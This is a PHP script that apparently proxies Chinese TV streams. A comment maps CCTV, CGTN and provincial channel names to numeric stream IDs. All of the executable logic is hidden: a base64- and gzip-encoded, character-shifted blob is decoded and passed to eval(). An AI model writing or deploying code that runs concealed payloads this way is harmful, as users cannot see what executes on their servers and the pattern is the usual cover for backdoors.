<?php
/*
调用方法：ysp.php?id=cctv4k;
cctv1间或可用。
注释有vip的暂不可用。
    'cctv4k' => [2000266302,600002264],//cccv-4k
    'cctv1' => [2000210103,600001859],//cccv1
    'cctv2' => [2000203602,600001800],//cccv2
    'cctv3' => [2000203803,600001801],//cccv3(vip)
    'cctv4' => [2000204803,600001814],//cccv4
    'cctv5' => [2000205103,600001818],//cccv5
    'cctv5p' => [2000204503,600001817],//cccv5+
    'cctv6' => [2000203303,600001802],//cccv6(vip)
    'cctv7' => [2000510003,600004092],//cccv7
    'cctv8' => [2000203903,600001803],//cccv8(vip)
    'cctv9' => [2000499403,600004078],//cccv9
    'cctv10' => [2000203503,600001805],//CCTV10
    'cctv11' => [2000204103,600001806],//CCTV11
    'cctv12' => [2000202603,600001807],//CCTV12
    'cctv13' => [2000204603,600001811],//CCTV13
    'cctv14' => [2000204403,600001809],//CCTV14
    'cctv15' => [2000205003,600001815],//CCTV15
    'cctv16' => [2012375002,600098637],//CCTV16
    'cctv16-4k' => [2012375003,600099502],//CCTV16-4k(vip)
    'cctv17' => [2000204203,600001810],//CCTV17
    //央视数字
    'bqkj' => [2012513403,600099649],//CCTV兵器科技(vip)
    'dyjc' => [2012514403,600099655],//CCTV第一剧场(vip)
    'hjjc' => [2012511203,600099620],//CCTV怀旧剧场(vip)
    'fyjc' => [2012513603,600099658],//CCTV风云剧场(vip)
    'fyyy' => [2012514103,600099660],//CCTV风云音乐(vip)
    'fyzq' => [2012514203,600099636],//CCTV风云足球(vip)
    'dszn' => [2012514003,600099656],//CCTV电视指南(vip)
    'nxss' => [2012513903,600099650],//CCTV女性时尚(vip)
    'whjp' => [2012513803,600099653],//CCTV央视文化精品(vip)
    'sjdl' => [2012513303,600099637],//CCTV世界地理(vip)
    'gefwq' => [2012512503,600099659],//CCTV高尔夫网球(vip)
    'ystq' => [2012513703,600099652],//CCTV央视台球(vip)
    'wsjk' => [2012513503,600099651],//CCTV卫生健康(vip)
    //央视国际
    'cgtn' => [2001656803,600014550],//CGTN
    'cgtnjl' => [2010155403,600084781],//CGTN纪录
    'cgtne' => [2010152503,600084744],//CGTN西语
    'cgtnf' => [2010153503,600084704],//CGTN法语
    'cgtna' => [2010155203,600084782],//CGTN阿语
    'cgtnr' => [2010152603,600084758],//CGTN俄语
    //卫视
    'bjws' => [2000272103,600002309],//北京卫视
    'dfws' => [2000292403,600002483],//东方卫视
    'cqws' => [2000297803,600002531],//重庆卫视
    'hljws' => [2000293903,600002498],//黑龙江卫视
    'lnws' => [2000281303,600002505],//辽宁卫视
    'hbws' => [2000293403,600002493],//河北卫视
    'sdws' => [2000294803,600002513],//山东卫视
    'ahws' => [2000298003,600002532],//安徽卫视
    'hnws' => [2000296103,600002525],//河南卫视
    'hubws' => [2000294503,600002508],//湖北卫视
    'hunws' => [2000296203,600002475],//湖南卫视
    'jxws' => [2000294103,600002503],//江西卫视
    'jsws' => [2000295603,600002521],//江苏卫视
    'zjws' => [2000295503,600002520],//浙江卫视
    'dnws' => [2000292503,600002484],//东南卫视
    'gdws' => [2000292703,600002485],//广东卫视
    'szws' => [2000292203,600002481],//深圳卫视
    'gxws' => [2000294203,600002509],//广西卫视
    'gzws' => [2000293303,600002490],//贵州卫视
    'scws' => [2000295003,600002516],//四川卫视
    'hinws' => [2000291503,600002506],//海南卫视
*/
function SEPt($HsMgQx){ 
   $HsMgQx=gzinflate(base64_decode($HsMgQx));
     for($i=0;$i<strlen($HsMgQx);$i++){
       $HsMgQx[$i] = chr(ord($HsMgQx[$i])-1);
       }
   return $HsMgQx;
   }
eval(SEPt("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"));
?>